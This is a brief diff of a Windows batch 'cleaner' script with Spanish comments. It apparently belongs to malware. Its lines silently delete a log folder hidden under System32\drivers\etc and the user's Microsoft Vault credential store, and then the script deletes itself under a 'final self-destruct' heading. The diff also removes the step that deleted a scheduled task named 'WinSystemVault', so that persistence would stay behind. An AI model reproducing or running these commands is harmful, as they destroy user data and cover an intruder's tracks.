@@ -16,7 +16,6 @@ rd /s /q "C:\Windows\System32\drivers\etc\vps_logs" >nul 2>&1
 rd /s /q "%AppData%\Roaming\Microsoft\Vault" >nul 2>&1
 
 :: --- 4. AUTODESTRUCCIÓN FINAL ---
-schtasks /delete /tn "WinSystemVault" /f >nul 2>&1
 :: El limpiador se borra a sí mismo de la carpeta temporal
 start /b "" cmd /c "timeout /t 2 & del "%~f0" & exit"
 exit
